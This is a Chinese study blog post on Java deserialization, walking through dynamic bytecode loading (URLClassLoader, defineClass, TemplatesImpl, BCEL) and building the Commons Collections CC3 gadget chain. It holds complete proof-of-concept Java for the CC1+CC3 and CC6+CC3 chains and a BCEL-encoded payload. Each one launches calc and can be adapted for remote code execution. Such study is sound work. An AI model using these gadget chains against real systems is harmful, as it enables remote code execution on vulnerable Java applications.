---
title: CC3
date: 2025-09-01T17:00:00+08:00
tags:
  - "CC链-反序列化"
categories:
  - "Java安全"
description: Java 反序列化学习 - CC3链
showToc: true
draft: false
tocOpen: true
---
再次深入学习动态加载字节码：

# 动态加载字节码
## 1、什么是Java的字节码
> 严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。
>

java的核心就是跨平台运行，Java编译的结果--字节码（.class文件）交给 JVM 去运行，同时如果其他语言可以编译为字节码文件，也可以交由 JVM 运行

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703016.png)

## 2、动态加载字节码的方法
### 2.1 利用 URLClassLoader 加载远程 class 文件
> 解释 URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。
>
> 正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：
>
> + URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件
> + URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件
> + URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类
>
> 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。
>

#### 2.1.1 file 协议
先编译一个文件：

```java
import java.io.IOException;

public class Calc {
    static {
        try{
            Runtime.getRuntime().exec("calc");
        } catch(IOException e){
            e.printStackTrace();
        }
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703146.png)

使用 URLClassLoader 加载：

```java
import java.net.URL;
import java.net.URLClassLoader;

public class ClassLoader_Calc {
    public static void main(String[] args) throws Exception {
        URLClassLoader  urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///E:\\")});
        Class calc = urlClassLoader.loadClass("Calc");
        calc.newInstance();
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703834.png)

#### 2.1.2 http 协议
先用python 起一个 http 服务：

```python
python -m http.server 8999
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703718.png)

```python
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class HelloClassLoader {
    public static void main(String[] args) throws MalformedURLException, InstantiationException, IllegalAccessException, ClassNotFoundException {
        URL[] urls = {new URL("http://localhost:8999/")};
        URLClassLoader classLoader = URLClassLoader.newInstance(urls);
        Class c = classLoader.loadClass("Calc");
        c.newInstance();
    }
}
```





### 2.2 利用 ClassLoader#defineClass 直接加载字节码
> 不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：
>

ClassLoader#loadClass -> ClassLoader#findClass -> ClassLoader#defineClass

+ `loadClass` 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass
+ `findClass` 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass
+ `defineClass` 的作用是处理前面传入的字节码，将其处理成真正的Java类



学习如何让系统的 defineClass 来直接加载字节码：



```python
import java.lang.reflect.Method;
import java.util.Base64;

public class DefineClass {
    public static void main(String[] args) throws Exception {
        //获取 ClassLoader 的 defineClass 方法
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);

        //将 base64 字符串解码成 class 文件的字节码
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
        //在系统类加载器上调用 defineClass，将字节数组定义成一个 Class 对象
        Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code, 0, code.length);
        //调用无参构造
        hello.newInstance();
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704376.png)

跟进 <font style="color:#080808;background-color:#ffffff;">defineClass 看到它是一个 protected 属性，无法直接访问，所以上述例子中用反射调用。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704651.png)



### 2.3 利用 TemplatesImpl 加载字节码
<font style="color:#080808;background-color:#ffffff;">defineClass 方法无法直接使用，但是呢，TemplatesImpl 类中给我们提供了一个入口：</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704748.png)

<font style="color:#080808;background-color:#ffffff;">TemplatesImpl 类继承了 </font>ClassLoader ，<font style="color:#080808;background-color:#ffffff;">并重写 defineClass 方法，并且是可以被外部调用</font>

现在以 <font style="color:#080808;background-color:#ffffff;">TemplatesImpl#defineClass 为终点</font>跟踪一下这条链：



<font style="color:#080808;background-color:#ffffff;">查找用法：TemplatesImpl.TransletClassLoader.defineClass</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704129.png)

<font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font>

<font style="color:#080808;background-color:#ffffff;">defineTransletClasses 函数还是私有的，继续找</font>

<font style="color:#080808;background-color:#ffffff;">这里查找 defineTransletClasses 的用法后，找到三个结果</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704550.png)

<font style="color:#080808;background-color:#ffffff;">getTransletClasses 和 getTransletIndex() 都是返回了一个储存值，用于后续操作</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704137.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704963.png)

而 <font style="color:#080808;background-color:#ffffff;">getTransletInstance 中  .newInstance()  会调用无参构造创建一个实例，可以用于我们后续的代码执行所以重点跟它</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704644.png)

来到 <font style="color:#080808;background-color:#ffffff;">newTransformer 函数，它是公有的，到这里就可以了</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704704.png)



**小总结一下：**

<font style="color:#080808;background-color:#ffffff;">TemplatesImpl.TransletClassLoader.defineClass</font>

<font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font>

<font style="color:#080808;background-color:#ffffff;">TemplatesImpl.getTransletInstance.defineTransletClasses</font>

<font style="color:#080808;background-color:#ffffff;">TemplatesImpl.newTransformer.getTransletInstance</font>





<font style="color:#080808;background-color:#ffffff;">TemplatesImpl</font>

<font style="color:#080808;background-color:#ffffff;">newTransformer</font>

<font style="color:#080808;background-color:#ffffff;">getTransletInstance</font>

<font style="color:#080808;background-color:#ffffff;">defineTransletClasses</font>

<font style="color:#080808;background-color:#ffffff;">defineClass</font>

<font style="color:#080808;background-color:#ffffff;">TransletClassLoader.defineClass</font>





接下来构造 POC：

首先满足俩个条件：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704837.png)

进入 <font style="color:#080808;background-color:#ffffff;">defineTransletClasses -> newInstance</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704050.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716057.png)

<font style="color:#080808;background-color:#ffffff;">前后结合一下，将 _bytecodes 构造为一维数组套二维数组：</font>

```java
byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
byte[][] codes = {code};
```

_tfactory 这个变量被标记为  <font style="color:#080808;background-color:#ffffff;">transient （不可序列化）</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705518.png)

然后在 readObject 中找：看到已经被赋值了

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705580.png)





先来一个要执行的类：将其编译后放在指定位置

```java
import java.io.IOException;

public class Test  {
    static  {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class HelloTemplateImpl {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();

        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");

        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        //这里先赋值看poc是否成功
        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates, new TransformerFactoryImpl());


        templates.newTransformer();
    }
}

```

<font style="color:#080808;background-color:#ffffff;">执行后报错：NullPointerException</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705977.png)



<font style="color:#080808;background-color:#ffffff;">调试查找哪里出了问题：</font>

<font style="color:#080808;background-color:#ffffff;">可以看到 _transletIndex:-1。我们需要进入到 if 语句才能正常执行</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705557.png)

<font style="color:#080808;background-color:#ffffff;">所以要让执行类继承 </font><font style="color:rgb(44, 62, 80);">AbstractTranslet</font><font style="color:#080808;background-color:#ffffff;"> 类(对应：ABSTRACT_TRANSLET)，</font>



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705525.png)

<font style="color:#080808;background-color:#ffffff;">最终完整的执行类：</font>

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test  extends AbstractTranslet{
    static  {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        
    }
}
```

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class HelloTemplateImpl {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();

        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");

        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates, new TransformerFactoryImpl());


        templates.newTransformer();
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705801.png)



### <font style="color:#080808;background-color:#ffffff;">2.4 利用 BCEL ClassLoader 加载字节码</font>
> BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。
>
> 关于BCEL的详细介绍：[《BCEL ClassLoader去哪了》](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)



```java
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

public class BCEL {
    public static void main(String[] args) throws Exception {
        Class calc = Class.forName("Calc");
        JavaClass javaClass = Repository.lookupClass(calc);
        String code = Utility.encode(javaClass.getBytes(),true);
        System.out.println(code);

    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705534.png)

<font style="color:#080808;background-color:#ffffff;">执行后可以看到有一对乱码：</font><font style="color:rgb(80, 80, 92);">BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。</font>

```java
$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A
```



> BCEL 这个包中有个有趣的类`com.sun.org.apache.bcel.internal.util.ClassLoader`，他是一个 ClassLoader，但是他重写了 Java 内置的`ClassLoader#loadClass()`方法。
>
> 在 `ClassLoader#loadClass()` 中，其会判断类名是否是 `$$BCEL$$` 开头，如果是的话，将会对这个字符串进行 decode

```java
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class BCELRCE {
    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException {
        new ClassLoader().loadClass("$$BCEL$$" + "$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A").newInstance();
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706693.png)



# CC3 链分析
## 环境：
JDK ：8u65

<font style="color:#080808;background-color:#ffffff;">commons-collections 3.2.1</font>

<font style="color:#080808;background-color:#ffffff;"></font>

## 分析链
CC3 利用的就是上文分析的 ”利用 TemplatesImpl 加载字节码“这条链，然后结合 CC1/CC6 的前半部分形成可用 POC。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706437.png)

### TemplatesImpl 链：
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test  extends AbstractTranslet{
    static  {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        
    }
}
```

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class HelloTemplateImpl {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();

        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");

        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates, new TransformerFactoryImpl());


        templates.newTransformer();
    }
}
```



### CC1 + CC3 （**<font style="color:rgb(44, 62, 80);">InvokerTransformer）</font>**
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706301.png)

#### CC1：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;


public class CC1Test {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}




```



结合一下啊：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();

        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");

        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates, new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null, null),

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(1);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706042.png)



#### CC6：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6Test02 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry( lazyMap,"aaa");

        HashMap<Object, Object> map2 = new HashMap<>();
        Object o = map2.put(tiedMapEntry, "bbb");

        map.remove("aaa");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryFiled = lazyMapClass.getDeclaredField("factory");
        factoryFiled.setAccessible(true);
        factoryFiled.set(lazyMap,chainedTransformer);

        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```



```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3Test02 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();

        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");

        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        Field tfactoryFiled = tc.getDeclaredField("_tfactory");
        tfactoryFiled.setAccessible(true);
        tfactoryFiled.set(templates, new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null),

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map<Object, Object> map = new HashMap();
        Map<Object, Object> outerMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tme = new TiedMapEntry(outerMap, "aaa");
        Map expMap = new HashMap();
        expMap.put(tme, "value");
        
        map.remove("aaa");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryFiled = lazyMapClass.getDeclaredField("factory");
        factoryFiled.setAccessible(true);
        factoryFiled.set(outerMap, chainedTransformer);

        serialize(expMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706864.png)





### CC3 （<font style="color:rgb(26, 32, 44);">InstantiateTransformer</font>）
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707898.png)

#### 分析：
而在 ysoserial 中并没有使用 **<font style="color:rgb(44, 62, 80);">InvokerTransformer</font>**<font style="color:rgb(44, 62, 80);">，这是因为黑名单过滤时很有可能会将 </font>**<font style="color:rgb(44, 62, 80);">InvokerTransformer </font>**<font style="color:rgb(44, 62, 80);">直接禁用，为了更广泛的使用， ysoserial 换了一条路：</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707295.png)

> 《Java 安全漫谈》中也有提及
>
> 2015年初，@frohoff和@gebl发布了Talk[《Marshalling Pickles: how deserializing objects will ruin your day》](https://frohoff.github.io/appseccali-marshalling-pickles/)，以及Java反序列化利用工具ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似 [Serialkiller](https://github.com/ikkisoft/SerialKiller) 这样的工具随之诞生。
>
> SerialKiller是一个ava反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的[黑名单](https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf)：
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716289.png)
>
> 这个黑名单中InvokerTransformer赫然在列，也就切断了CommonsCollections1的利用链。有攻就有防，ysoserial随后增加了不少新的Gadgets，其中就包括CommonsCollections3。
>
